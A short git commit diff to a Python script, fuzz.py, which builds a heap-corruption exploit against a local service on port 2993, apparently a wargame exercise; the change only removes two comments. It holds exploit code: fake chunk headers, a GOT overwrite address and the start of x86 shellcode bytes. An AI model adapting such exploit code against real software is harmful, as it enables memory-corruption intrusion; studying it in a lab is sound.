7c7ef6af689485b0e4fbfbe995f80ec0d282080f
jonatanhal <jonatanhaltorp@gmail.com>
2017-05-21 14:46:33 +0200

    Update fuzz.py

--- fuzz.py
+++ fuzz.py
@@ -2,11 +2,10 @@ import socket, struct, sys
 
 pack = lambda dword: struct.pack("I", dword)
 TARGET=("127.0.0.1", 2993)
-got_write=0x804d41c-12 # +12 to adjust for the -12
+got_write=0x804d41c-12
 mem=0x804e010
 F="".join([pack(dword) for dword in [0xfffffffc, 0xfffffffc, got_write, mem]])
 S="\xeb\x0c\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
-# xor eax,eax
 S+="\x31\xc0"+\
 "\x50"+\
 "\xb8\x20\x6c\x6f\x6c"+\
